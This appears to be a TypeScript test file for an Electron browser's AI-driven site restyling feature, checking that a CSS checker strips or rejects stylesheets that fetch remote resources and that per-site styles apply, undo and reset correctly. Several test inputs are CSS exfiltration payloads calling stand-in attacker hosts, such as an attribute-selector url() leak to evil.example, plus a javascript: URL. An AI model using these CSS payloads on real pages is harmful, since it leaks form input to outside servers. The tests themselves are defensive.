import assert from 'node:assert/strict'
import { readFileSync, rmSync, writeFileSync } from 'node:fs'
import path from 'node:path'
import { beforeEach, test } from 'node:test'
import type { WebContents } from 'electron'
import { userData } from '../mocks/electron'
import { CssChecker, Restyler, siteOf, type RestyleDeps } from '../../src/main/restyle'
import type { RestyleSettings } from '../../src/main/settings'

const stylesPath = path.join(userData, 'styles.json')

/**
 * Stands in for Chromium's parse and serialize: CSSStyleSheet drops @import rules and otherwise
 * (for the CSS used here) gives back what it was given.
 */
const serialize = async (css: string) => css.replace(/^@import[^;]*;\s*/gm, '')

function checker(serializer: (css: string) => Promise<string | null> = serialize) {
  const c = new CssChecker()
  ;(c as unknown as { serialize: typeof serializer }).serialize = serializer
  return c
}

const quiet = async <T>(fn: () => Promise<T>): Promise<T> => {
  const [error, log] = [console.error, console.log]
  console.error = console.log = () => {}
  try {
    return await fn()
  } finally {
    console.error = error
    console.log = log
  }
}

test('siteOf is the hostname without www, for websites only', () => {
  assert.equal(siteOf('https://www.example.com/a'), 'example.com')
  assert.equal(siteOf('HTTP://Example.com:8080/'), 'example.com')
  assert.equal(siteOf('http://localhost:3000/'), 'localhost')
  assert.equal(siteOf('http://[::1]/'), '[::1]')
  assert.equal(siteOf('https://bücher.de/'), 'xn--bcher-kva.de')
  assert.equal(siteOf('https://www2.example.com/'), 'www2.example.com')
  for (const url of ['file:///C:/a.html', 'about:blank', 'chrome-extension://x/y.html', 'https://', '', 'javascript:alert(1)']) {
    assert.equal(siteOf(url), null, url)
  }
})

test('CssChecker keeps a stylesheet that fetches nothing', async () => {
  const css = 'body { color: red !important; }\na::after { content: "url(https://evil.example/)"; }'
  assert.deepEqual(await checker().check(css), { css, removed: 0 })
})

test('CssChecker keeps data: URLs', async () => {
  const css = 'a { background: url("data:image/png;base64,AAAA") !important; }'
  assert.deepEqual(await checker().check(css), { css, removed: 0 })
})

test('CssChecker replaces url(), image-set() and src() that fetch', async () => {
  const css = [
    'input[value^="a"] { background: url("https://evil.example/a") !important; }',
    'b { background-image: image-set(url("x.png") 1x, url("y.png") 2x); }',
    'c { background-image: -webkit-image-set("a.png" 1x); }',
    '@font-face { font-family: x; src: url("//evil/f.woff"); }',
    'd { mask: url("data:image/svg+xml,<svg/>"), url("/relative.svg"); }',
  ].join('\n')
  const result = await checker().check(css)
  assert.ok(result)
  assert.doesNotMatch(result.css, /evil|x\.png|a\.png|relative/)
  assert.match(result.css, /data:image\/svg/)
  assert.equal(result.removed, 5)
})

test('CssChecker counts @import rules that Chromium dropped', async () => {
  const result = await checker().check('@import url("https://evil.example/x.css");\na { color: red; }')
  assert.deepEqual(result, { css: 'a { color: red; }', removed: 1 })
})

test('CssChecker drops a stylesheet that still fetches after stripping', async () => {
  // An unquoted url() can't come out of Chromium's serializer, so the strict check catches it.
  assert.equal(await checker().check('a { background: url(https://evil.example/) }'), null)
  // A serializer that put the reference back.
  let calls = 0
  const stubborn = checker(async (css) => (++calls === 1 ? css : 'a { background: url("https://evil.example/") }'))
  assert.equal(await stubborn.check('a { background: url("https://x/") }'), null)
})

test('CssChecker is not fooled by quotes in escapes or strings', async () => {
  // The escaped quote doesn't start a string that would hide the url().
  assert.equal(await checker().check(String.raw`.a\"b { background: url(https://evil/) } .c { content: "x" }`), null)
  // A url() inside a string is only text.
  const css = 'a::before { content: "see url(https://example.com) and @import"; }'
  assert.deepEqual(await checker().check(css), { css, removed: 0 })
  // Nor is an @import in a string counted as one taken out.
  assert.deepEqual(await checker().check(`@import url("x.css");\n${css}`), { css, removed: 1 })
})

test('CssChecker gives up when the stylesheet cannot be parsed', async () => {
  assert.equal(await checker(async () => null).check('a { color: red }'), null)
  // The real one, with no Electron here, fails to parse and says so instead of throwing.
  assert.equal(await quiet(() => new CssChecker().check('a { color: red }')), null)
})

// ---------- Restyler ----------

function settings(over: Partial<RestyleSettings> = {}): RestyleSettings {
  return { agent: 'claude', model: 'sonnet', codexModel: '', claudePath: '', codexPath: '', ...over }
}

function fakePage(url: string, id = 1) {
  const wc = {
    id,
    url,
    destroyed: false,
    inserted: new Map<string, string>(),
    next: 0,
    getURL: () => wc.url,
    isDestroyed: () => wc.destroyed,
    async insertCSS(css: string) {
      const key = `k${++wc.next}`
      wc.inserted.set(key, css)
      return key
    },
    async removeInsertedCSS(key: string) {
      wc.inserted.delete(key)
    },
    async capturePage() {
      return { isEmpty: () => false, getSize: () => ({ width: 800, height: 600 }), toJPEG: () => Buffer.from('jpeg') }
    },
    async executeJavaScriptInIsolatedWorld() {
      return { title: 'T', viewport: '800×600', dark: false, outline: 'body', vars: '' }
    },
  }
  return wc
}

function restyler(pages: ReturnType<typeof fakePage>[] = [], over: Partial<RestyleSettings> = {}) {
  const notes: string[] = []
  let changes = 0
  const deps: RestyleDeps = {
    settings: () => settings(over),
    pages: () => pages as unknown as WebContents[],
    onChange: () => void changes++,
    notify: (text) => void notes.push(text),
  }
  const r = new Restyler(deps)
  ;(r as unknown as { checker: CssChecker }).checker = checker()
  return { r, notes, changes: () => changes }
}

const settle = () => new Promise((resolve) => setTimeout(resolve, 10))

const store = (sites: object) => writeFileSync(stylesPath, JSON.stringify(sites))
const change = (prompt: string, css: string) => ({ prompt, css, note: `did ${prompt}`, at: 1 })

beforeEach(() => rmSync(stylesPath, { force: true }))

test('a page gets its site’s latest stylesheet when it navigates', async () => {
  store({ 'example.com': { enabled: true, changes: [change('red', 'a { color: red; }'), change('blue', 'a { color: blue; }')] } })
  const wc = fakePage('https://www.example.com/x')
  const { r } = restyler([wc])
  r.load()
  r.onNavigate(wc as unknown as WebContents)
  await settle()
  assert.deepEqual([...wc.inserted.values()], ['a { color: blue; }'])
})

test('other sites, disabled sites and non-web pages get nothing', async () => {
  store({ 'example.com': { enabled: false, changes: [change('red', 'a { color: red; }')] } })
  const { r } = restyler()
  r.load()
  for (const url of ['https://example.com/', 'https://other.com/', 'file:///C:/x.html']) {
    const wc = fakePage(url)
    r.onNavigate(wc as unknown as WebContents)
    await settle()
    assert.equal(wc.inserted.size, 0, url)
  }
})

test('a stylesheet edited by hand to fetch from a server is not inserted', async () => {
  store({ 'example.com': { enabled: true, changes: [change('x', 'a { background: url(https://evil/) }')] } })
  const wc = fakePage('https://example.com/')
  const { r } = restyler([wc])
  r.load()
  r.onNavigate(wc as unknown as WebContents)
  await settle()
  assert.equal(wc.inserted.size, 0)
})

test('undo, disable and reset update open pages and styles.json', async () => {
  store({ 'example.com': { enabled: true, changes: [change('red', 'a { color: red; }'), change('blue', 'a { color: blue; }')] } })
  const wc = fakePage('https://example.com/')
  const elsewhere = fakePage('https://other.com/', 2)
  const { r, changes } = restyler([wc, elsewhere])
  r.load()
  r.onNavigate(wc as unknown as WebContents)
  await settle()

  r.undo('example.com')
  await settle()
  assert.deepEqual([...wc.inserted.values()], ['a { color: red; }'])
  assert.equal(JSON.parse(readFileSync(stylesPath, 'utf8'))['example.com'].changes.length, 1)

  r.setEnabled('example.com', false)
  await settle()
  assert.equal(wc.inserted.size, 0)
  assert.deepEqual(r.styledSites(), [{ host: 'example.com', changes: 1, enabled: false }])

  r.setEnabled('example.com', true)
  await settle()
  r.reset('example.com')
  await settle()
  assert.equal(wc.inserted.size, 0)
  assert.equal(elsewhere.inserted.size, 0)
  assert.deepEqual(JSON.parse(readFileSync(stylesPath, 'utf8')), {})
  assert.equal(changes(), 4)
})

test('undoing the last change forgets the site', () => {
  store({ 'a.com': { enabled: true, changes: [change('red', 'a { color: red; }')] } })
  const { r } = restyler()
  r.load()
  r.undo('a.com')
  assert.deepEqual(r.styledSites(), [])
  assert.equal(r.view('https://a.com/')?.changes.length, 0)
  // Unknown sites are ignored.
  r.undo('nope.com')
  r.reset('nope.com')
  r.setEnabled('nope.com', false)
  r.cancel('nope.com')
})

test('view describes the page’s site', () => {
  store({ 'example.com': { enabled: true, changes: [change('red', 'a{}')] } })
  const { r } = restyler()
  r.load()
  assert.deepEqual(r.view('https://www.example.com/page'), {
    host: 'example.com',
    changes: [{ prompt: 'red', note: 'did red' }],
    enabled: true,
    running: null,
  })
  assert.deepEqual(r.view('https://new.com/'), { host: 'new.com', changes: [], enabled: true, running: null })
  assert.equal(r.view('about:blank'), null)
})

test('styledSites is sorted and leaves out sites with no changes', () => {
  store({ 'zeta.com': { enabled: true, changes: [change('a', 'a{}')] }, 'alpha.com': { enabled: false, changes: [change('a', 'a{}'), change('b', 'b{}')] }, 'empty.com': { enabled: true, changes: [] } })
  const { r } = restyler()
  r.load()
  assert.deepEqual(r.styledSites(), [
    { host: 'alpha.com', changes: 2, enabled: false },
    { host: 'zeta.com', changes: 1, enabled: true },
  ])
})

test('a corrupt styles.json starts empty', async () => {
  writeFileSync(stylesPath, '{nope')
  const { r } = restyler()
  await quiet(async () => r.load())
  assert.deepEqual(r.styledSites(), [])
})

test('restyle says when the agent’s command is missing, and leaves the site as it was', async () => {
  const wc = fakePage('https://example.com/')
  const missing = path.join(userData, 'no-such-dir', process.platform === 'win32' ? 'claude.exe' : 'claude')
  const { r, notes } = restyler([wc], { claudePath: missing })
  await quiet(() => r.restyle(wc as unknown as WebContents, '  make it red  '))
  assert.equal(notes.length, 1)
  assert.match(notes[0], /^Couldn't restyle example\.com: jbrow can't find the claude command/)
  assert.deepEqual(r.styledSites(), [])
  assert.equal(r.view('https://example.com/')?.running, null)
})

test('restyle names Codex when it is the agent', async () => {
  const wc = fakePage('https://example.com/')
  const { r, notes } = restyler([wc], { agent: 'codex', codexPath: path.join(userData, 'missing-codex') })
  await quiet(() => r.restyle(wc as unknown as WebContents, 'red'))
  assert.match(notes[0], /can't find the codex command/)
})

test('restyle ignores empty prompts and pages that are not websites', async () => {
  const { r, notes, changes } = restyler()
  await r.restyle(fakePage('https://example.com/') as unknown as WebContents, '   ')
  await r.restyle(fakePage('file:///C:/x.html') as unknown as WebContents, 'red')
  assert.deepEqual(notes, [])
  assert.equal(changes(), 0)
})
